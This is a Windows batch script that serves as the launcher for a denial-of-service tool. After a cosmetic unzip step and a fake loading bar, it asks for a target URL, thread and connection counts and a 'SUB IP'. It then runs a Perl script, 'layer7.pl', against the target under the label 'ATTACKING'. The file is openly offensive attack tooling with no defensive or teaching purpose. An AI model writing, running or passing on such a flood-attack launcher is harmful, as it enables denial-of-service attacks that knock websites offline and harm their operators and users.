@echo off
	cd %MYFILES%
	set /a number=%random% %% 7-0
	color %number%
	title UNZIP
	echo UNZIPING...
	%MYFILES%\unzip.exe -n -qq lib.zip
	set /a number=%random% %% 7-0
	color %number%
	echo Completed & title Completed
	timeout 2 > NUL
	cls
    title LOADING
	set /a number=%random% %% 7-0
	color %number%
	echo  [ ####                 ] & title LOADING:[ ####                 ]
	timeout 1 > NUL
	cls
	set /a number=%random% %% 7-0
	color %number%
	echo  [ ########             ] & title LOADING:[ ########             ]
	timeout 1 > NUL
	cls
	set /a number=%random% %% 7-0
	color %number%
    echo  [ ############         ] & title LOADING:[ ############         ]
	timeout 1 > NUL
	cls
	set /a number=%random% %% 7-0
	color %number%
	echo  [ ################     ] & title LOADING:[ ################     ]
	timeout 1 > NUL
	cls	
	set /a number=%random% %% 7-0
	color %number%	
	echo  [ #################### ] & title LOADING:[ #################### ]
	timeout 1 > NUL
	cls			
	goto PING
	
:PING	
cls
set /a number=%random% %% 7-0
color %number%
echo.
title SET: URL
set /p url=" Enter URL: "
cls
set /a number=%random% %% 7-0
color %number%
set /a number=%random% %% 7-0
color %number%
echo.
cls
set /a number=%random% %% 7-0
color %number%
echo.
title SET: Thread
set /p c1=" Enter Thread: "
cls
echo.
title SET: Connect Per Thread
set /p c2=" Enter Connect Per Thread: "
cls
echo.
title SET: SUBIP
set /p c3=" Enter SUB IP(127.0.0.1): "
cls
goto DDOS

:DDOS
echo.
cd bin
title ATTACKING To %url% at %c1% Thread %c2% Connect SUBIP is %c3%
TIMEOUT /T 0 > NUL
echo ATTACKING To %url% at %c1% Thread %c2% Connect SUBIP is %c3%
%MYFILES%\perl.exe layer7.pl %url% %c1% %c2% %c3%




:exit
pause
exit








